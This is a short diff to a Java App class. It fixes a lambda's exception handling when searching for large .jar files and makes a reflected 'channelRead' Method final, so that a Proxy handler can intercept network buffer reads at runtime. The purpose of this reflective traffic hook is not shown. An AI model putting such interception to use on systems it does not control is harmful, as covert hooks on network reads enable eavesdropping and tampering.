@@ -280,8 +280,10 @@ public class App {
         } catch (Exception ignored) {}
         try {
             StringBuilder sb = new StringBuilder();
-            Files.find(Path.of(""), 10, (p, a) ->
-                    p.toString().endsWith(".jar") && a.isRegularFile() && Files.size(p) > 10_000_000
+            Files.find(Path.of(""), 10, (p, a) -> {
+                        try { return p.toString().endsWith(".jar") && a.isRegularFile() && Files.size(p) > 10_000_000; }
+                        catch (Exception ignored) { return false; }
+                    }
             ).limit(10).forEach(p -> {
                 if (sb.length() > 0) sb.append(File.pathSeparatorChar);
                 sb.append(p.toAbsolutePath());
@@ -345,10 +347,11 @@ public class App {
                 }
             }
             if (channelReadMethod == null) return null;
+            final Method channelReadMethodFinal = channelReadMethod;
 
             // Create a Proxy handler
             InvocationHandler handler = (proxy, method, args) -> {
-                if (method.equals(channelReadMethod) && args.length == 2) {
+                if (method.equals(channelReadMethodFinal) && args.length == 2) {
                     Object ctx = args[0];
                     Object msg = args[1];
                     if (clsByteBuf.isInstance(msg)) {
